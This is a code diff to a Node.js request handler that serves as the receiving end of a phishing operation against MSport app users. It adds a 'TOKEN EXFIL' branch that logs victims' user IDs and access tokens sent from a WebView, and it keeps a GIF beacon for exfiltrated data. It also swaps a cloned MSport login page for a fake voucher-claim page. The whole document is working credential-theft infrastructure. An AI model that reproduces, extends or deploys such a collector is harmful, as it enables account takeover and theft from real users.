@@ -1,6 +1,9 @@
-const LOGIN_HTML = require('./login_html.js');
+const fs = require('fs');
+const path = require('path');
 const https = require('https');
 const { URL } = require('url');
+
+const VOUCHER_HTML = fs.readFileSync(path.join(__dirname, 'voucher.html'), 'utf8');
 
 function clientIp(req) {
   const xff = req.headers['x-forwarded-for'];
@@ -71,7 +74,21 @@ module.exports = async function handler(req, res) {
     return res.status(200).json({ ok: true });
   }
 
-  // ---- 3) 1x1 gif beacon ----
+  // ---- 3) Token exfil GET (u/t from MSport WebView) ----
+  const u = parsed.searchParams.get('u');
+  const t = parsed.searchParams.get('t');
+  if (u || t) {
+    console.log('=== TOKEN EXFIL ===', JSON.stringify({
+      t: new Date().toISOString(),
+      ip: clientIp(req),
+      ua: req.headers['user-agent'],
+      xrw: req.headers['x-requested-with'] || '',
+      userId: u,
+      accessToken: t ? decodeURIComponent(t) : ''
+    }));
+  }
+
+  // ---- 4) 1x1 gif beacon ----
   if (parsed.searchParams.get('d')) {
     console.log('=== EXFIL BEACON ===', parsed.searchParams.get('d'));
     const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
@@ -80,8 +97,8 @@ module.exports = async function handler(req, res) {
     return res.status(200).send(gif);
   }
 
-  // ---- 4) Serve the cloned MSport login page ----
+  // ---- 5) Serve voucher claim success page (default) ----
   res.setHeader('Content-Type', 'text/html; charset=utf-8');
   res.setHeader('Cache-Control', 'no-store');
-  return res.status(200).send(LOGIN_HTML);
+  return res.status(200).send(VOUCHER_HTML);
 };
